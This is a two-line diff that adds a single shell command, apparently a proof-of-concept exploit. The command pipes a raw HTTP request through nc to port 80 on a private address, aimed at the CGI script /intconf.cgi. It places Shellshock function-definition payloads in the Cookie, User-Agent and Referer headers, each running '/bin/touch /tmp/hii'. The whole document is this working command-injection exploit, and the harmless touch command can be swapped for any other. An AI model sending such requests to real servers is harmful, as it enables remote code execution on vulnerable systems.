@@ -1,0 +1,2 @@
+printf "GET /intconf.cgi HTTP/1.1\r\nCookie: () { :;}; /bin/touch /tmp/hii\r\nHost: 10.6.66.42\r\nUser-Agent: () { :;}; /bin/touch /tmp/hii\r\nConnection: close\r\nReferer: () { :;}; /bin/touch /tmp/hii\r\n\r\n" | nc 10.6.66.42 80
+
